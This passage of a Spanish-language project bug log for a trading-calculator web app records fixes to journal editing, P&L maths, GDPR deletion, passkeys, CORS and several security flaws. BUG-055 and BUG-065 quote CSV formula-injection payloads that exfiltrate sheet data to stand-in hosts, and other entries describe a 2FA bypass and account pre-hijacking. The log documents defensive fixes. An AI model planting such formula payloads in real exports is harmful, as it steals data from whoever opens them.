| BUG-052 | **Editar una operación abría el formulario VACÍO, y guardar la reemplazaba por los valores por defecto.** `TradeFormModal` se renderiza SIEMPRE desde `TradeJournal` —devuelve `null` cuando está cerrado, pero **después** de los hooks— así que nunca se desmonta y el inicializador de `useState` corre **una sola vez, en la carga de la página**, cuando `initialTrade` todavía es `null`. No había ni `key` ni `useEffect` que resincronizara al abrir. Resultado: pulsar el lápiz de una fila mostraba un formulario en blanco con el producto por defecto, y al guardar se enviaba eso encima de la operación real. Verificado en el navegador contra el build de producción: la fila dice `GBPJPY` y el campo de símbolo del formulario venía vacío. **Venía de `main`**, no de esta rama: el mismo montaje está en la versión desplegada. El cambio de fechas de BUG-049 lo habría agravado —las ediciones pasaron a enviar `entry_date`/`exit_date`, así que además habrían pisado las fechas guardadas con el estado obsoleto del formulario. Fix: `key={editingTrade?.id || 'nueva'}`, que fuerza un montaje nuevo por operación, que es cuando el estado inicial se lee de verdad. | 🔴 | ✅ Resuelto (2026-08-08) |

| BUG-053 | **`truncated` se calculaba después del filtro por producto, y decía `false` sobre una ventana.** La consulta ya viene acotada a `ANALYTICS_MAX_TRADES + 1`; el filtro se aplica sobre esas filas. Con 5.000 operaciones se leen 1.001 y, al filtrar por opciones, quedan (por ejemplo) 50: `len(rows) > 1000` da `false` y la respuesta afirma que no hay truncado — pero esas 50 son las opciones que había DENTRO de la ventana, y puede haber cientos más entre las 4.000 que no se leyeron. Es exactamente el tipo de afirmación que `truncated` existe para impedir. El comentario del código decía «el filtro se aplica ANTES del techo», que era falso: el techo lo pone la consulta. Fix: `truncated` sale de si la CONSULTA se topó con el tope, no de las filas ya filtradas. Con el mismo defecto estaba `products_available` —su comentario decía «historial COMPLETO» siendo también de la ventana—, así que la respuesta publica ahora `products_available_partial` en vez de dar la lista por completa. Encontrado en la revisión del PR. | 🟠 | ✅ Resuelto (2026-08-08) |

---

*Última actualización: 2026-08-06 — Fase 0 de la auditoría del diario: orden cronológico en `/journal/stats`, breakeven y profit factor honestos, topes de `limit`, aviso de truncado y congelación del diario de `localStorage` (BUG-040 a BUG-043). El choque de esquemas en `db.trades` (BUG-039) queda documentado y pendiente del modelo unificado.*

---

| BUG-039 (cierre) | **Resuelto el choque de esquemas de `db.trades`.** El diagnóstico está arriba; esto es el arreglo. Cuatro capas, porque traducir al leer no basta si se siguen generando documentos divergentes: (1) **`normalize_trade_schema`** en `performance.py`, llamada desde `compute_trade_pnl` —punto único por el que pasa TODO cálculo de P&L—, así que un documento legado vale su importe real en cualquier ruta de lectura desde el despliegue, sin esperar a la migración. El mapeo clave es `leverage` → `multiplier`: en el diario legado el P&L es `(exit−entry) × quantity × leverage` y en el canónico `(exit−entry) × quantity × multiplier`, misma posición en la fórmula, así que la traducción reproduce el importe **exacto** y no una aproximación (verificado con apalancamiento 1, 3, 5 y 10, y en corto). (2) **`POST /journal/trades` persiste ya en snake_case**: acepta el mismo payload camelCase por compatibilidad de API, pero deja de crear documentos del esquema viejo — cortar la fuente es lo que impide que el problema se regenere. (3) **Los dos `PUT` hacen `$unset`** de las claves legacy: `$set` no borra, así que sin él un documento migrado al vuelo conservaba las camelCase junto a las canónicas y el choque se reproducía en el mismo documento recién arreglado. (4) **`migrate_trades_schema.py`**, idempotente, con dry-run por defecto, copia en `trades_migration_backup` y `--rollback`; un documento cuyo P&L recalculado no cuadre con el guardado se marca para revisión y **no se toca** — migrarlo escribiría una cifra que el usuario nunca vio. `roe` deja de almacenarse (era un derivado guardado, que es un campo condenado a desfasarse) y se recalcula en la respuesta. Verificado contra **Postgres 16 real**, no solo unitario: `$unset` efectivo, tablas creadas, importes intactos tras migrar y rollback restaurando. 21 tests nuevos. | 🔴 | ✅ Resuelto (2026-08-06) |

| BUG-044 | **Cuatro listas de colecciones escritas a mano, y datos personales que sobrevivían al borrado de cuenta.** `trading_plans` guardaba `user_id` pero no estaba en la purga por retención, ni en `delete_account`, ni en el export de `/auth/my-data` (G-15) — borrar la cuenta dejaba los planes del usuario en la base de datos, que es la infracción del RGPD art. 17 que el propio `ESTADO_PROYECTO` ya anotaba con «multa detrás». Al arreglarlo apareció que el borrado de cuenta del usuario (`DELETE /auth/account`) tenía **su propia** lista, distinta de la del admin y también incompleta: le faltaban además `journal_entries`. **Causa raíz: no es que la lista estuviera mal, es que había cuatro.** Fix: una sola tupla `_USER_DATA_COLLECTIONS` de la que derivan `_ALL_USER_COLLECTIONS` (borrado) y `_EXPORTABLE_COLLECTIONS` (portabilidad), más dos categorías con semántica propia y declarada — `_BILLING_COLLECTIONS` y `_USER_NON_PURGED_COLLECTIONS` (los referidos son créditos ganados, no datos de trading: se borran con la cuenta pero la purga por impago no los toca) y `_SECURITY_ARTEFACT_COLLECTIONS`, que se borran y **nunca se exportan** porque mandarle sus propios tokens al usuario es una regresión de seguridad, no portabilidad. El export recorre la tupla en vez de enumerar a mano, así que una colección nueva entra por estar declarada. `journal_entries` y `trades_migration_backup` se dan de alta además en `known` (el shim no autocrea tablas: una colección en las rutas del RGPD pero ausente de `known` revienta en la primera consulta, justo cuando alguien borra su cuenta). Tests que fijan las invariantes, no la lista de hoy: lo que se purga se borra, lo que se borra se exporta salvo seguridad, y toda colección declarada tiene tabla. | 🔴 | ✅ Resuelto (2026-08-06) |

---

*Última actualización: 2026-08-06 (2) — cerrado el choque de esquemas que perdía el P&L (BUG-039) y unificadas las cuatro listas de colecciones del RGPD (BUG-044, cierra G-15 y G-20).*

---

| BUG-045 | **El riesgo por operación se calculaba sin el tamaño de contrato, así que la regla del 1-2 % nunca saltaba en opciones, futuros ni forex.** La regla 3 de `detect_errors` (`oversize`) medía `abs(entry − sl) × quantity` — **sin multiplicar por `multiplier`**, que es el campo donde vive el tamaño de contrato y que el propio `compute_trade_pnl` sí usaba dos funciones más abajo para el P&L. Consecuencia: un contrato de opciones (×100) declaraba un riesgo cien veces menor que el real y un lote de forex (×100 000), cien mil veces menor. Una posición que arriesgaba el 25 % de la cuenta pasaba como si arriesgara el 0,00025 %, y la regla que existe precisamente para avisar del sobredimensionamiento **no saltaba jamás** en los tres productos donde el sobredimensionamiento es más fácil. El defecto sobrevivió porque el diario sólo contemplaba `spot` (×1) y `option`, y en `spot` la fórmula es correcta por coincidencia: multiplicar por 1 no se nota. Fix: `_effective_contract_size(trade)` —el mismo resolutor que usa el P&L, con el catálogo detrás— entra en el cálculo del riesgo. Test que fija las dos mitades: con ×100 salta y con ×1 no, sobre la misma operación. | 🟠 | ✅ Resuelto (2026-08-06) |

| BUG-046 | **El `$unset` de las claves legadas habría borrado el apalancamiento de una operación nueva.** Al convertir `leverage` en campo canónico (decide margen, ROE y liquidación) chocaba con su papel anterior: en el diario legado `leverage` ocupaba la posición del multiplicador en la fórmula del P&L, y por eso está en `_LEGACY_FIELD_MAP` y en `LEGACY_TRADE_KEYS`. Los dos `PUT` construían el `$unset` como `{k: "" for k in LEGACY_TRADE_KEYS if k in existing}` — sobre un documento **canónico** con `leverage: 20`, la clave está presente, así que entraba en el `$unset`. Y `_apply_update_operators` aplica el `$unset` **después** del `$set`: el apalancamiento recién guardado se borraba en la misma escritura que lo guardaba. Detectado antes de desplegar, leyendo el orden de los operadores en el shim. Fix en dos piezas: (1) `is_legacy_trade` mira sólo las claves camelCase, así que un documento con `leverage` y nada más **no es legado** y no se traduce a `multiplier` (que habría multiplicado su P&L por veinte); (2) `legacy_keys_to_unset(stored)` decide qué borrar según lo que el documento sea — de uno legado, todo; de uno canónico, sólo `roe`, que es un derivado almacenado. 3 tests fijan las dos ramas. | 🔴 | ✅ Resuelto (2026-08-06) |

---

*Última actualización: 2026-08-06 (3) — el riesgo por operación ignoraba el tamaño de contrato (BUG-045) y el `$unset` de claves legadas habría borrado el apalancamiento canónico (BUG-046).*

---

*Actualizado 2026-08-07 — examen completo del proyecto: 693 tests de backend, E2E de navegador en escritorio y móvil sobre el build de producción, y BUG-047 (precios de materias primas inventados en el respaldo de `/api/prices`).*

---

| BUG-054 | **Bypass de 2FA: el token pre-segundo-factor valía como token de acceso.** `get_current_user` decodificaba el JWT y devolvía el usuario **sin comprobar el `type` del token**, a diferencia de `require_user` y `require_admin`, que sí exigen `type == "access"`. El `2fa_pending` se emite tras validar la contraseña pero ANTES del segundo factor (`/auth/login` lo devuelve con `totp_required: true`), y su propio docstring promete *"Never a valid access token"* — promesa que el código incumplía. Cinco endpoints dependen de `get_current_user`, entre ellos leer, **escribir y borrar** posiciones guardadas: con SÓLO la contraseña robada, sin el TOTP, un atacante operaba en la cuenta. **Verificado con PoC contra el backend real**: 3/3 endpoints devolvían HTTP 200 con el token pre-2FA; tras el arreglo, 401. Fix: `get_current_user` filtra `payload.get("type") != "access"` igual que las otras dos puertas. Dos tests nuevos lo fijan, uno que comprueba las **tres** dependencias a la vez para que no vuelva a divergir. | 🔴 | ✅ Resuelto (2026-08-10) |

| BUG-055 | **Inyección de fórmulas en el export CSV de administración.** `GET /admin/users.csv` construía el CSV con `csv.DictWriter`, que entrecomilla pero **no neutraliza fórmulas**. El campo `name` lo elige el usuario libremente (`UserCreate.name: str`, sin validación) y el CSV lo abre un **admin**: es el patrón atacante-almacena / víctima-abre. Un nombre como `=HYPERLINK("http://evil/?d="&A2,"click")` exfiltra datos de la hoja con un clic al abrirla en Excel/LibreOffice; con DDE se llega a ejecución de comandos. **Verificado por el camino real del export** (`_serialize_admin_user` → `_csv_safe`): el nombre malicioso se almacena tal cual pero sale del CSV con un apóstrofo antepuesto que la hoja trata como texto literal. Fix: helper `_csv_safe` en `server.py` (antepone `'` a las celdas que empiezan por `= + - @`, tab o CR) aplicado a cada celda del export, y la misma protección en `lib/csv.js` (export del diario). 12 tests. | 🟠 | ✅ Resuelto (2026-08-10) |

| BUG-056 | **`/performance` se anunciaba en el sitemap siendo una ruta premium bloqueada por `robots.txt`.** El generador declaraba en su cabecera que excluye las rutas premium, pero incluía `/performance` en `PAGES` — y esa ruta es `ProtectedRoute premiumOnly` y está en el `Disallow` de `robots.txt`. Anunciar una URL en el sitemap mientras robots la prohíbe genera el aviso *"enviada pero bloqueada por robots.txt"* en Search Console y resta autoridad al resto del sitemap. Fix: fuera de `gen-sitemap.js`; el sitemap regenerado ya no la lista. La referencia pública del diario, cuando exista, irá con ruta propia sin muro (ver AUDITORIA_DIARIO §6.4). | 🟡 | ✅ Resuelto (2026-08-10) |

| SEC-DEPS | **12 CVE en dependencias: 3 de `aiohttp` (parcheadas), 9 de `starlette` (evaluadas, no alcanzables).** `aiohttp` 3.14.1 → **3.14.3** (patch, cierra sus 3 CVE; sólo es dependencia transitiva de `cloud-sql-python-connector`, no lo importa ningún módulo). Las 9 de `starlette` 0.41.3 son **todas DoS por parsing de multipart/form-data** y su fix exige subir FastAPI de 0.115 a ≥0.128, un salto de versión mayor que en este proyecto **ya rompió el login una vez** (BUG-037) y que se despliega a mano sin poder probar el deploy desde el sandbox. **No alcanzables**: la app no tiene ni un endpoint que declare `Form`/`File`/`UploadFile`, así que FastAPI nunca invoca el parser vulnerable. Decisión: parchear aiohttp ahora; la subida de FastAPI queda **recomendada pero pendiente de un deploy controlado**, con prueba del flujo de login incluida, por el precedente de BUG-037. | 🟠 | aiohttp ✅ · FastAPI/starlette ⏳ recomendado |

---

*Actualizado 2026-08-10 — auditoría ofensiva: bypass de 2FA por confusión de tipo de token (BUG-054, verificado con PoC), inyección de fórmulas en el CSV admin (BUG-055), `/performance` fuera del sitemap (BUG-056) y parcheo de aiohttp (SEC-DEPS). Sin IDOR, sin XSS DOM, sin SSRF, sin fugas de credenciales; el shim SQL y los webhooks de pago verificados.*

---

| BUG-057 | **Account pre-hijacking: el enlazado federado dejaba la contraseña del atacante viva.** El registro no exige demostrar posesión del email (`email_verified: False`) y el login funciona igualmente sin verificarlo. `google_auth` busca la cuenta **por email** y, si existe, la reutiliza rellenando `google_sub` — sin tocar la contraseña. Ataque completo (Sudhodanan & Paverd, 2022): el atacante registra el correo de la víctima, se guarda la contraseña y espera; cuando la víctima entra con Google aterriza en **esa misma cuenta**, y el atacante conserva acceso permanente a su diario, sus posiciones y sus datos. **Verificado con PoC contra el backend real**: tras el enlazado, `POST /auth/login` con la contraseña del atacante seguía devolviendo HTTP 200. Fix: Google acaba de PROBAR la posesión del correo, así que una contraseña previa sobre un email **nunca verificado** la puso alguien que jamás demostró ser el dueño — se retira (`password: None`), se marca `email_verified: True` y se **revocan las sesiones vivas** por si el atacante tenía un token abierto (sin eso seguiría dentro hasta una hora). El dueño real recupera contraseña con "he olvidado mi contraseña", que sí prueba posesión del buzón. Si el email **ya estaba verificado**, el enlazado es legítimo y no se toca nada — o el arreglo sería una denegación de servicio para usuarios reales. Tras el fix el PoC devuelve 401. 4 tests, incluido el caso legítimo. | 🔴 | ✅ Resuelto (2026-08-10) |

---

*Actualizado 2026-08-10 (2) — account pre-hijacking en el enlazado con Google (BUG-057), encontrado al auditar el flujo de alta y acceso.*

---

| FEAT-PASSKEYS | **Passkeys (WebAuthn/FIDO2): alta y acceso sin contraseña.** Añadido el único método de acceso de la app que **resiste el phishing**: la clave privada no sale del dispositivo y el navegador sólo la ofrece al origen exacto que la registró, así que una web clonada no puede pedirla aunque el usuario caiga. Módulo `passkeys.py` **puro** (no importa `server.py`, no toca la BD, no conoce FastAPI) + seis rutas en `server.py` + `lib/passkeys.js`, `PasskeyButton` en el login y `PasskeysCard` en Ajustes. Tres invariantes fijadas por tests: el **reto es de un solo uso y caduca a los 5 min** (si se pudiera repetir, capturar una respuesta válida bastaría para repetir el acceso); el **`sign_count` sólo puede subir** (si no avanza, o es replay o el autenticador está clonado — salvo los que siempre reportan 0, donde exigir avance rompería el acceso legítimo); y el **origen/RP ID son los del FRONTEND, no los del backend** (la web va en Pages y la API en Cloud Run: configurarlo con el de la API haría que ninguna passkey validara). El acceso es *usernameless*, así que **no revela si una cuenta existe**. Una passkey ya son dos factores, así que no se vuelve a pedir el TOTP. Colecciones `passkey_credentials` y `webauthn_challenges` dadas de alta en `known` y en los artefactos de seguridad: se borran con la cuenta y **no se exportan** (son material de autenticación). **Verificado con el autenticador virtual de Chrome contra el backend real**: ceremonia completa de alta y acceso, los dos replays rechazados (400/401), y por la interfaz real alta desde Ajustes + entrada al dashboard sin escribir correo ni contraseña. 18 tests. | 🟢 | ✅ Hecho (2026-08-10) |

---

*Actualizado 2026-08-10 (3) — passkeys operativas de punta a punta (FEAT-PASSKEYS).*

---

| BUG-058 | **La regla que impedía la inyección en logs cubría un fichero y una forma, no la propiedad.** Era un regex por líneas sobre `server.py`: un f-string partido en dos líneas se le escapaba, y los otros once módulos del backend no los miraba nadie. Se descubrió porque **CodeQL marcó un `logging.info(...)` recién escrito por el propio asistente** y la regla no lo vio. Medido con `ast` sobre todo el backend: **48 f-strings crudos y 88 argumentos `%` sin sanear en 11 módulos** —incluidos correos, símbolos y `user_id` que vienen del usuario—, cualquiera de los cuales admite un `\n` que falsifique una línea de log. Fix: la regla se reescribe con `ast` y busca la **propiedad** (un valor no saneado que entra en una llamada de log) en vez de una forma sintáctica; `log_safe` sale de `server.py` a **`log_seguro.py`** para que puedan importarlo los doce módulos; y los 136 sitios se sanean. Se le añade además un `.replace()` explícito de `\r` y `\n` que **ya era redundante** con el `isprintable()` posterior: CodeQL modela `str.replace` y no modela un `isprintable()` dentro de un generador, así que el código era correcto y la herramienta no podía verlo. | 🟠 | ✅ Resuelto (2026-08-22) |
| BUG-059 | **El máximo y el mínimo de 52 semanas se fabricaban con el precio de hoy.** `stock_data.py` hacía `fiftyTwoWeekHigh or price`: cuando el proveedor no daba el dato, la ficha enseñaba **el precio actual como si fuera el máximo del año**. No es un hueco vacío, es una cifra falsa con aspecto de medida, y encima una sobre la que se dimensionan posiciones. Fix: `_redondea_o_nada()` devuelve `None`, y la interfaz pinta el hueco. Regla 2 de las de honestidad numérica: lo que no se puede calcular es `None`, no un valor de relleno. | 🟠 | ✅ Resuelto (2026-08-22) |
| BUG-060 | **El indicador «LIVE» del panel de opciones estaba escrito a mano.** Se pintaba verde y con el punto que palpita **siempre**, con un precio de hace un segundo y con uno de ayer por igual: un adorno que afirmaba algo que nadie comprobaba. Debajo, la cascada de failover de `market_data.py` —que sí sabe si un precio está fresco— llevaba `stale` y `as_of` desde su primera línea y **no la llamaba ninguna ruta viva**. Fix: la cascada se enchufa a `/api/stock/{symbol}` (entra cuando Yahoo no devuelve precio), la respuesta arrastra `stale`, `as_of` y `source`, y el indicador sale de `stock.stale`: ámbar, con la antigüedad al lado y **sin el punto que palpita** cuando el precio no se pudo refrescar — lo que palpita dice «esto se está actualizando», que es justo lo que no pasa. | 🟠 | ✅ Resuelto (2026-08-22) |
| BUG-061 | **`POST /backtest` metía el apalancamiento en el P&L y devolvía una curva de equity inventada.** `move_pct = ((price − entry) / entry) × 100 × side × leverage` —el invariante que este repositorio tiene escrito en mayúsculas— y el P&L no salía del movimiento del precio sino de `balance × 2 % × (move_pct / stop_loss_pct)` recortado a una banda, **etiquetado `data_source: "yfinance"`** como si fuera resultado de datos reales. `profit_factor` usaba encima otra definición distinta (`(wins × TP)/(losses × SL)`, como si toda ganancia cerrara en el objetivo) y valía `0.0` sin pérdidas, que es indefinido, no cero. La ruta **no la llamaba ninguna pantalla**. Fix: retirada, junto con `_simulate_backtest_trades`, que multiplicaba igual por la palanca y no la llamaba nadie. Lo que hacía bien ya lo hace `POST /backtest/validate` sobre `backtest.py`, con hold-out y walk-forward. | 🔴 | ✅ Resuelto (2026-08-22) |
| BUG-062 | **`POST /referrals/redeem-credit` mentía dos veces.** Devolvía un `available_after` restado de un saldo **que no bajaba** (`referral_wallet_redeemed` no se incrementaba nunca), y escribía `pending_referral_credit` con el mensaje «aplicado al próximo checkout» cuando **ningún camino de cobro lo lee**. El monedero sí se llena —`credit_referrer_for_payment` está enganchado a los tres cobros y hace `$inc` sobre `referral_wallet`—, así que es dinero que el sistema debe y prometía devolver por una vía inexistente. Fix: responde **501 mientras `CHECKOUT_APLICA_CREDITO` sea False** y no escribe nada al hacerlo; el `$inc` queda puesto para el día que el checkout lo aplique de verdad, y `test_referrals_credito_unit.py` fija que la constante y el código concuerden. `GET /referrals/me` devuelve ya `redeemable` para que ninguna pantalla pinte un botón que da 501. **Sigue sin pantalla**: es la fila `ARREGLAR` de `RUTAS_MUERTAS.md`. | 🟠 | 🟡 Backend arreglado, sin interfaz (2026-08-22) |
| BUG-063 | **El dividendo se afirmaba en 0,0 en los tres sitios donde no se sabía**, y el rango anual se inventaba con un ±30 %. Hermano de BUG-059, encontrado al verificar lo que se iba a escribir en este diario. (a) `get_stock_data` ponía `dividendYield: 0.0` fijo — **el endpoint de chart de Yahoo no publica el dividendo**, así que ese cero no venía del proveedor, lo escribía nuestro código, y no dice «no lo sé» sino «esta acción no paga dividendo», que de KO o JNJ es falso. Y `q` entra en el Black-Scholes de toda la app: suponerlo 0 sobrevalora las calls e infravalora las puts. (b) `_normalize_dividend_yield` hacía `raw or 0.0`, la misma conversión de «no lo sé» en «no paga». (c) El estado de error —la respuesta que existe justo para decir que no se sabe nada— tenía todo a `None` **menos** el dividendo. (d) `_build_stock_dict` sacaba el máximo de 52 semanas de `precio × 1.3` y el mínimo de `precio × 0.7`: no es una aproximación conservadora, es un número inventado con forma de medida. Fix: `_normaliza_dividendo_o_nada()` devuelve `None` sin dato y conserva la normalización decimal/porcentaje; los tres sitios devuelven `None`; `_build_stock_dict` usa `_redondea_o_nada`. El frontend ya lo soportaba (`typeof === 'number'` en `CalculatorPage`, `show52wHigh = high52wX !== null` en `PayoffChart`), así que el usuario ve el hueco y su propio valor editable en vez de una afirmación del servidor. **La prueba de integración era parte del problema**: exigía `isinstance(dividendYield, (int, float))`, y un test que prohíbe decir «no lo sé» obliga a mentir — ahora acepta `None` o un número con sentido. 7 tests nuevos, los cuatro sitios saboteados uno a uno para comprobar que fallan. | 🟠 | ✅ Resuelto (2026-08-22) |
| BUG-064 | **La revocación de sesión mataba el token recién emitido si el re-login caía en el mismo segundo.** `change-password` y `reset-password` sellan `user_revocations.revoked_after` con `datetime.now()`, es decir con **microsegundos**, y `_is_user_session_revoked` comparaba `iat_dt < revoked_after`. Pero el `iat` de un JWT es un NumericDate en **segundos enteros**: PyJWT descarta la fracción al codificar. Un token emitido en el mismo segundo del cambio tiene `iat = X.000000`, que es `< X.234567`, así que la sesión **nueva** nacía muerta. Y es justo el caso que el producto provoca: la respuesta del endpoint le dice al usuario que vuelva a entrar, y un cliente rápido —o el propio SPA re-logueando solo— cae dentro de ese segundo. Parece intermitente porque la ventana es de ≤1 s y se cura reintentando un instante después. Afecta a los dos puntos que revocan. **Reproducido en vivo** contra el backend real: sin el arreglo la primera sesión ya sale 401 y a partir de ahí todo cae en cascada, porque el token muerto tampoco sirve para volver a cambiar la contraseña; con el arreglo, 5/5 sesiones vivas. Fix: `iat_dt < revoked_after.replace(microsecond=0)` — un token del segundo X sobrevive a una revocación sellada en el segundo X y los de segundos anteriores siguen muriendo (el residual, un token del mismo segundo pero anterior al cambio, vive menos de un segundo: es el compromiso estándar de revocar por segundo, y el access token dura una hora). 4 tests en `test_session_revocation_unit.py`, **saboteados para comprobar que fallan sin el arreglo** (2 de los 4 se caen). | 🟡 | ✅ Resuelto (2026-08-23) |

---

*Actualizado 2026-08-22 — sesión de las rutas muertas: la regla de log injection cubría un fichero y una forma (BUG-058), 52 semanas fabricadas con el precio de hoy (BUG-059), el «LIVE» escrito a mano sobre una cascada de failover desconectada (BUG-060), el backtest que metía la palanca en el P&L (BUG-061), el canje de crédito que prometía lo que nadie aplicaba (BUG-062) y el dividendo afirmado en 0,0 donde no se sabía (BUG-063, encontrado al verificar lo que iba a escribirse aquí — y con una prueba de integración que era parte del problema).*

---

*Actualizado 2026-08-23 — la revocación de sesión mataba el token del mismo segundo (BUG-064). Venía arreglado en una rama sin fusionar que lo numeraba como BUG-058, número que `main` ya había dado a la regla de log injection: fusionarla habría dejado dos BUG-058 en el diario.*

---

| BUG-065 | **La protección contra inyección de fórmulas en CSV cubría UN exportador de tres.** BUG-055 se arregló poniendo `_csv_safe` en `/admin/users.csv`, y la función se quedó viviendo dentro de `server.py`. El CSV de liquidaciones de afiliados (`GET /admin/affiliates/payout-runs/{rid}/export.csv`) vive en `affiliate_program.py`, que **no importa nada de `server.py`**, así que escribía sin sanear `affiliate_email`, `payout_method` y —lo grave— `payout_details` **descifrado**, que es el campo donde el afiliado teclea libremente sus datos de cobro. Forma exacta de BUG-055: **el atacante almacena y el administrador abre**, y aquí el administrador abre el fichero justamente para pagarle. Una celda que empieza por `=` la evalúa la hoja al abrirla: `=HYPERLINK("http://malo/?d="&A1,"ok")` exfiltra con un clic, y por DDE se llega a ejecución de comandos; entrecomillar no desactiva nada. Fix: la lógica sale a **`csv_seguro.py`** —mismo movimiento que `log_seguro.py` y por el mismo motivo: una defensa que sólo alcanza al módulo donde se escribió no es una defensa— y se aplica en los tres exportadores. El del diario (`/performance/export`) se sanea también aunque ahí el que exporta y el que abre suelen ser la misma persona: deja de serlo en cuanto alguien manda su diario a un mentor o a su gestor. **La regla que faltaba** es `ast` sobre todos los módulos: ninguna llamada a `writerow`/`writerows` puede escribir datos sin pasar por el saneador — comprobar sólo que el saneador funciona habría dejado pasar exactamente este fallo. La regla siguió la variable para no marcar en rojo `writerows(rows)` con `rows` ya saneado, porque un verificador que grita con código correcto se desactiva y deja de proteger. Encontrado por el examen integral del 2026-08-23; 12 tests, saboteado en tres direcciones (quitar el saneador de un exportador, degradar la lista de disparadores, y el inverso: que no salte con código correcto). | 🔴 | ✅ Resuelto (2026-08-23) |

---

*Actualizado 2026-08-23 — examen integral: la protección de CSV cubría un exportador de tres y el de afiliados quedaba abierto al admin que abre el fichero para pagar (BUG-065).*

---

| BUG-066 | **Cambiar de idioma dejaba media pantalla en el idioma anterior.** `t` vivía en el store de zustand como una función única que leía `get().locale` en cada llamada: traducía bien, pero su **identidad no cambiaba nunca**. Y diecisiete `useMemo`/`useCallback` de once ficheros la llevaban como única dependencia relacionada con el idioma (`useMemo(() => [...], [brokers, t])`), así que **no se recalculaban jamás** y se quedaban congelados en el idioma del primer render. Medido en el navegador: al pasar de español a inglés en la portada, el menú decía «Pricing» y la descripción de Margex seguía en español, **en la misma pantalla**. Afectaba a las tarjetas de socios y brókers con su jurisdicción, los nombres y buscadores de estrategias de opciones (`StrategyBar`, `OptionStrategyPicker`), el constructor de setups, el plan de trading, la tabla de objetivos de salida y el detector de patrones. Salió a la luz al quitar el diccionario español de `main.js`: con `es` incrustado el fallo existía igual, pero se veía menos porque el idioma congelado solía ser el que el visitante ya tenía. **Fix en la causa, no en los diecisiete sitios**: `creaT(locale)` devuelve una función nueva por idioma, y `setLocale`/`bootI18n`/`loadEduDict` la reponen. Añadir `locale` a cada array de dependencias habría dejado el mismo agujero abierto para el memo número dieciocho; con la identidad ligada al idioma, `[t]` pasa a ser una dependencia correcta y el patrón natural es el que funciona. **La sonda que lo caza** (`tests/e2e/navegador/idioma-arranque.js`) mira dos textos al cambiar de idioma: uno normal y uno memoizado. No es adorno — con el sabotaje fiel (identidad estable, traducción correcta) el menú pasa a «Pricing» sin problema y **sólo** el texto memoizado se queda atrás: una prueba de idioma que mirase la navegación, que es lo natural, habría dado verde con el fallo dentro. | 🟠 | ✅ Resuelto (2026-08-24) |

---

*Actualizado 2026-08-24 — al sacar el diccionario español de `main.js` (−297 KB del arranque) apareció BUG-066: `t` con identidad estable congelaba diecisiete memos en el idioma del primer render.*

---

| BUG-067 | **El cutover de dominio dejó la web entera sin backend en producción.** Los commits `f5c79c5`+`4df5507`+`aea8a38` hicieron los pasos 3–6 de `MIGRACION_DOMINIO.md` —`public/CNAME`, `PUBLIC_URL: /`, `homepage`, `SITE_ORIGIN`— y **no** los pasos 1, 7 y 8, que el propio documento marca como «todo o nada, en este orden». Desde ese despliegue el navegador carga la web desde `https://tradingcalculator.pro`, un Origin que **no estaba** en `_CORS_ORIGINS` de `server.py` ni en la lista `allowed` de `missing_apis.py`: el navegador descarta **todas** las respuestas del backend y no funciona nada —ni login, ni precios, ni calculadoras con servidor—. **Y el checkout fallaba por una segunda vía, sin CORS de por medio**: `_get_allowed_origins()` se construye sobre esa misma lista, y `_validate_origin_url` la usa para validar el `origin_url` que `PricingPage` manda como `window.location.origin`; con el dominio fuera de la lista, `POST /payments/checkout` respondía **400 «Invalid origin_url»** por decisión del propio backend. Arreglar el CORS arregla las dos, porque las dos leen `_CORS_ORIGINS`. Es la misma clase que el 2026-08-05, en el sentido contrario, y se ve igual de mal: sin cabecera CORS el backend responde **200 con las cookies puestas** y es el navegador quien tira la respuesta, así que los logs de Cloud Run se ven perfectos y `curl` no lo reproduce. Comprobado por DNS en la sesión: `tradingcalculator.pro` ya resuelve a los cuatro registros A de GitHub Pages (`185.199.108–111.153`), o sea que el frontend se sirve y el backend es lo único caído. **Y había una segunda mitad**: el dominio que sí estaba permitido, `tradingcalculatorpro.com` (sin punto), **no es nuestro** —lo sirve un tercero desde Cloudflare— y con `allow_credentials=True` tenerlo en la lista le permitía leer respuestas autenticadas de nuestros usuarios; era además el destino de los enlaces de verificación, de reset y de los correos. Fix: la lista de CORS y `DEFAULT_FRONTEND_URL` pasan al dominio propio y el ajeno **sale**; las plantillas de correo dejan de llevar el literal y siguen a `FRONTEND_URL`; se corrigen los literales del paso 7 (`useSEO.js`, `index.html`, `robots.txt`, `sitemap.xml`, los `DEFAULT_ORIGIN` de los generadores) y los correos de contacto en los 10 idiomas. **La guarda que faltaba** compara la lista de CORS contra `frontend/public/CNAME`, que es el fichero que decide de verdad dónde se sirve la web: un test que sólo fijara la cadena a mano habría que acordarse de cambiarlo, y acordarse es justo lo que falló dos veces. Más su gemelo, que exige que el dominio ajeno no vuelva a colarse. Ambos saboteados en `probar-verificadores.sh`. | 🔴 | ✅ Resuelto en el repo (2026-08-28) — **requiere desplegar el backend** para surtir efecto |

| BUG-068 | **El cutover dejó todo el banco de pruebas de navegador apuntando a una ruta que ya no existe.** La base bajo la que se sirve el build estaba escrita **a mano en seis ficheros** de `tests/e2e/` (`entorno.js`, `contraste.js`, `csp-ensayo.js`, `modo-demo.js`, `probabilidad-medida.js`, `stack/servidor.js`) más tres usos en `stack/arriba.sh`, todos con `/Tradingcalculatorpro.com`. Al pasar el build a la raíz (`PUBLIC_URL: /`), las sondas siguieron pidiendo `http://127.0.0.1:3100/Tradingcalculatorpro.com/…` a un servidor que ya sirve desde `/`: **404 en todas**, y las dos comprobaciones de salud de `arriba.sh` abortando el arranque del stack. Es la misma forma que BUG-067 y por la misma razón —una constante copiada en N sitios que no siguió al dominio—, sólo que aquí la víctima es la herramienta que debería haber cazado BUG-067. Fix: la base sale de `process.env.E2E_BASE_PATH ?? ''`, vacía por defecto y forzable para probar un build antiguo. Encontrado al revisar el PR #214, que lo arreglaba en seis ficheros; aquí van los nueve usos, comentarios y README incluidos. | 🟠 | ✅ Resuelto (2026-08-28) |

| BUG-069 | **El empaquetado Android seguía apuntando al dominio viejo.** `packaging/twa-manifest.json` mantenía `host: abcde-rgb.github.io`, `startUrl: /Tradingcalculatorpro.com/?source=twa`, los accesos directos a `/Tradingcalculatorpro.com/dashboard` y `/…/options`, y `fullScopeUrl` e iconos en la URL de Pages. Una TWA compilada con eso abre el dominio equivocado y sus accesos directos dan 404; además el `fullScopeUrl` fuera del dominio verificado hace que la app se abra en pestaña de navegador con barra de direcciones en vez de a pantalla completa. No estaba tumbando nada hoy porque la app no está publicada —`assetlinks.json` aún lleva el SHA256 de ejemplo—, pero es una pieza del cutover que se quedó atrás. | 🟡 | ✅ Resuelto (2026-08-28) |

